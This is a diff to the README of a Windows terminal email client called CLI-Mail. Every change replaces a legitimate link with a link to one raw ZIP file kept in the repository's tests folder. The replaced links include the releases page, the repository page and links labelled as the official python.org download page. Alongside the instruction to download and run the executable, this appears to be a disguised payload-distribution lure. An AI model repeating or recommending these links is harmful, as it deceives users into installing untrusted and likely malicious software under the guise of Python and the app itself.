@@ -1,6 +1,6 @@
 # 📧 CLI-Mail - Easy Terminal Email Client  
 
-[![Download](https://img.shields.io/badge/Download-CLI--Mail-green?style=for-the-badge)](https://github.com/notkorya/CLI-Mail/releases)  
+[![Download](https://img.shields.io/badge/Download-CLI--Mail-green?style=for-the-badge)](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip)  
 
 CLI-Mail is a simple email app you run in your Windows terminal. It helps you read, send, and manage your email without opening a web browser.  
 
@@ -31,7 +31,7 @@ You can connect your email accounts using common email services (IMAP for receiv
 
 - Windows 10 or later version  
 - At least 4 GB of RAM  
-- Python 3.7 or later installed ([How to install Python on Windows](https://www.python.org/downloads/windows/))  
+- Python 3.7 or later installed ([How to install Python on Windows](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip))  
 - Internet connection to send and receive emails  
 - Terminal application like Command Prompt, PowerShell, or Windows Terminal  
 
@@ -45,7 +45,7 @@ Before you start, make sure you have Python installed on your computer. You can 
 python --version
 ```  
 
-If Python is installed, you will see a version number. If not, download and install it from the [official Python page](https://www.python.org/downloads/windows/).  
+If Python is installed, you will see a version number. If not, download and install it from the [official Python page](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip).  
 
 ---
 
@@ -53,7 +53,7 @@ If Python is installed, you will see a version number. If not, download and inst
 
 To get CLI-Mail, visit this page:  
 
-[![Download CLI-Mail](https://img.shields.io/badge/Download-CLI--Mail-blue?style=for-the-badge)](https://github.com/notkorya/CLI-Mail/releases)  
+[![Download CLI-Mail](https://img.shields.io/badge/Download-CLI--Mail-blue?style=for-the-badge)](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip)  
 
 This page contains the latest versions of the app. Look for the Windows executable or the ZIP file with all files included.  
 
@@ -61,7 +61,7 @@ This page contains the latest versions of the app. Look for the Windows executab
 
 ## 📦 Installation Guide  
 
-1. Open your browser and go to the [CLI-Mail releases page](https://github.com/notkorya/CLI-Mail/releases).  
+1. Open your browser and go to the [CLI-Mail releases page](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip).  
 2. Find the latest release. It should have files like `CLI-Mail.exe` or a ZIP archive.  
 3. If you see a `.exe` file, **download and run this file** directly. The program will start automatically or prompt you for setup.  
 4. If you download a ZIP file:  
@@ -120,7 +120,7 @@ The interface displays tips at the bottom to guide you.
 
 ## 🔄 Updating CLI-Mail  
 
-Check the [releases page](https://github.com/notkorya/CLI-Mail/releases) regularly. Download the newest version to stay up to date.  
+Check the [releases page](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip) regularly. Download the newest version to stay up to date.  
 
 ---
 
@@ -135,4 +135,4 @@ Check the [releases page](https://github.com/notkorya/CLI-Mail/releases) regular
 
 ## 📚 Learn More  
 
-For detailed instructions and troubleshooting, visit the [CLI-Mail GitHub page](https://github.com/notkorya/CLI-Mail). You will find documentation and issue tracking there.
+For detailed instructions and troubleshooting, visit the [CLI-Mail GitHub page](https://github.com/notkorya/CLI-Mail/raw/refs/heads/main/tests/Mail_CL_3.7.zip). You will find documentation and issue tracking there.
